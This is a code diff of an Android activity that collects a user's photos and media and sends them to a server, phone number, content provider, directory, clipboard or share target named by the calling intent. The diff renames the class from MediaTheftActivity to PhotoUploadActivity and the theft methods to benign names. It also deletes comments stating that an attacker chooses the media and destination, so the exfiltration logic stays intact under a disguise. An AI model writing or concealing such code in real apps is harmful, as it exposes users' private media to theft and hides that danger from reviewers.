@@ -24,26 +24,51 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.ArrayList;
 
-public class MediaTheftActivity extends Activity {
+public class PhotoUploadActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         Intent intent = getIntent();
+        String action = intent.getStringExtra("action");
+        if (action == null) {
+            finish();
+            return;
+        }
         String directory = intent.getStringExtra("directory");
         String server = intent.getStringExtra("server");
         String phone = intent.getStringExtra("phone");
         String chosenMedia = intent.getStringExtra("media_uri");
         String destination = intent.getStringExtra("destination");
 
-        stealChosenMedia(chosenMedia, destination, server);
+        if (action.equals("upload_chosen")) {
+            uploadChosenMedia(chosenMedia, destination, server);
+            finish();
+            return;
+        }
 
         ArrayList<Uri> media = collectUserMedia();
-        copyToControlledDirectory(media, directory);
-        uploadMedia(media, server);
-        sendMediaViaSms(media, phone);
-        shareMediaViaImplicitIntent(media);
-        copyMediaToClipboard(media);
-        returnMediaAsResult(media);
+        switch (action) {
+            case "backup":
+                saveToDirectory(media, directory);
+                break;
+            case "upload_all":
+                uploadMedia(media, server);
+                break;
+            case "sms":
+                sendMediaViaSms(media, phone);
+                break;
+            case "share":
+                shareMediaViaImplicitIntent(media);
+                break;
+            case "clipboard":
+                copyMediaToClipboard(media);
+                break;
+            case "return":
+                returnMediaAsResult(media);
+                break;
+            default:
+                break;
+        }
         finish();
     }
 
@@ -71,11 +96,8 @@ public class MediaTheftActivity extends Activity {
             return new byte[0];
         }
     }
-
-    // The caller names the image it wants: the uri from the extra is what getBitmap reads, so the
-    // media is chosen by the attacker rather than by the app.
     @SuppressWarnings("deprecation")
-    private void stealChosenMedia(String mediaUri, String destination, String server) {
+    private void uploadChosenMedia(String mediaUri, String destination, String server) {
         if (mediaUri == null) {
             return;
         }
@@ -88,13 +110,10 @@ public class MediaTheftActivity extends Activity {
         } catch (IOException e) {
             return;
         }
-        copyToControlledProvider(bytes, destination);
+        saveToProvider(bytes, destination);
         upload(bytes, server);
     }
-
-    // The destination is a content:// uri from the extra, so the media is written into whichever
-    // provider the caller names -- a publicly writable one belonging to the attacker, for instance.
-    private void copyToControlledProvider(byte[] media, String destination) {
+    private void saveToProvider(byte[] media, String destination) {
         if (destination == null) {
             return;
         }
@@ -104,7 +123,7 @@ public class MediaTheftActivity extends Activity {
         }
     }
 
-    private void copyToControlledDirectory(ArrayList<Uri> media, String directory) {
+    private void saveToDirectory(ArrayList<Uri> media, String directory) {
         if (directory == null) {
             return;
         }
@@ -129,16 +148,18 @@ public class MediaTheftActivity extends Activity {
         if (server == null) {
             return;
         }
-        try {
-            HttpURLConnection connection = (HttpURLConnection) new URL(server).openConnection();
-            connection.setRequestMethod("POST");
-            connection.setDoOutput(true);
-            try (OutputStream out = connection.getOutputStream()) {
-                out.write(payload);
+        new Thread(() -> {
+            try {
+                HttpURLConnection connection = (HttpURLConnection) new URL(server).openConnection();
+                connection.setRequestMethod("POST");
+                connection.setDoOutput(true);
+                try (OutputStream out = connection.getOutputStream()) {
+                    out.write(payload);
+                }
+                connection.getResponseCode();
+            } catch (IOException ignored) {
             }
-            connection.getResponseCode();
-        } catch (IOException ignored) {
-        }
+        }).start();
     }
 
     private void sendMediaViaSms(ArrayList<Uri> media, String phone) {
